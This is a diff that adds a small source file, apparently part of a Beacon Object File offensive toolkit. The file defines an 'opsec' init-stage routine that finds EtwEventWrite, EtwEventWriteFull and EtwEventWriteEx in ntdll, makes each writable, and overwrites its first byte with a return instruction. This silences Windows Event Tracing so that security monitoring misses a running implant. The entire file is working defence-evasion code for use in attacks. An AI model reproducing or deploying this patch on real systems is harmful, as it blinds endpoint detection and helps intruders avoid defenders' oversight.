@@ -1,0 +1,32 @@
+
+use bof;
+
+fn opsec_etw_patch_one(name: str) -> void {
+    var ntdll: u64 = (u64)Kernel32.GetModuleHandleA("ntdll.dll");
+    if ntdll == 0 {
+        ret;
+    }
+    var addr: u64 = (u64)Kernel32.GetProcAddress((void*)ntdll, name);
+    if addr == 0 {
+        ret;
+    }
+    var old: u32 = 0;
+    if Kernel32.VirtualProtect((void*)addr, (u64)1,
+            PAGE_EXECUTE_READWRITE, &old) == 0 {
+        ret;
+    }
+    // ret (0xC3) - return-immediately patch.
+    var p: char* = (char*)addr;
+    p[0] = (u8)0xC3;
+    var dummy: u32 = 0;
+    Kernel32.VirtualProtect((void*)addr, (u64)1, old, &dummy);
+    ret;
+}
+
+[Stage(Init)]
+fn opsec_etw_patch() -> void {
+    opsec_etw_patch_one("EtwEventWrite");
+    opsec_etw_patch_one("EtwEventWriteFull");
+    opsec_etw_patch_one("EtwEventWriteEx");
+    ret;
+}
